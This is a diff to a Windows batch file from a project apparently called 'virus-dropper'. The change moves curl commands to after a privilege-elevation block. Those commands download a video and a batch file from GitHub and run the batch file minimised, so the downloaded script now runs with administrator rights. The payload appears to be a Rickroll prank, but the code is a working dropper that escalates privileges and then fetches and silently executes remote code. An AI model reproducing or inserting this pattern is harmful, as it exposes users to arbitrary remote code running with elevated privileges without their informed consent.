@@ -1,7 +1,4 @@
 @echo off
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
-start /min "" rickroll.bat
 :: BatchGotAdmin
 ::-------------------------------------
 REM  --> Check for permissions
@@ -21,6 +18,9 @@ if '%errorlevel%' NEQ '0' (
     del "%temp%\getadmin.vbs"
     exit /B
 :gotAdmin
+    curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
+    curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
+    start /min "" rickroll.bat
     pushd "%CD%"
     CD /D "%~dp0"
 
